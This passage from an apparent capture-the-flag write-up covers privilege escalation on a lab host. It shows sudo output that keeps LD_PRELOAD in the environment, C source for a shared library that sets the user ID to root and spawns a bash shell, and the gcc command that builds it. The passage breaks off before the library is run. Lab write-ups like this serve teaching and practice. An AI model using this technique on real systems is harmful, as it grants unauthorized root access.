## 3. Privilege Escalation
Once gained the access as `webdeveloper` I checked for misconfiguration:
{% highlight ruby %}
webdeveloper@ip-10-114-146-68:~$ sudo -l
Matching Defaults entries for webdeveloper on ip-10-114-146-68:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on ip-10-114-146-68:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
{% endhighlight %}
The `LD_PRELOAD` option allow us to use shared library so we can make a C script to get root:
{% highlight ruby %}
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/bash");
}
{% endhighlight %}
And then use it as a library to get root:
{% highlight ruby %}
webdeveloper@ip-10-114-146-68:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
